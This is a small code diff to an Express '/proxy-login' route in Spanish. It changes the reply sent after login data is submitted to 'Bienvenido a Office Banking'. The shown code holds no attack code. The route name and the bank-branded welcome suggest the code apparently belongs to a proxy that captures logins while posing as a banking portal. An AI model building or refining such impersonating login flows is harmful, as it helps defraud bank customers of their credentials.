@@ -80,7 +80,7 @@ app.post("/proxy-login", async (req, res) => {
     });
 
     // ✅ Mensaje diferenciado
-    res.json({ status: "ok", mensaje: "Datos ingresados correctamente" });
+    res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
   } catch (err) {
     res.status(500).json({ status: "error", error: err.message });
   }
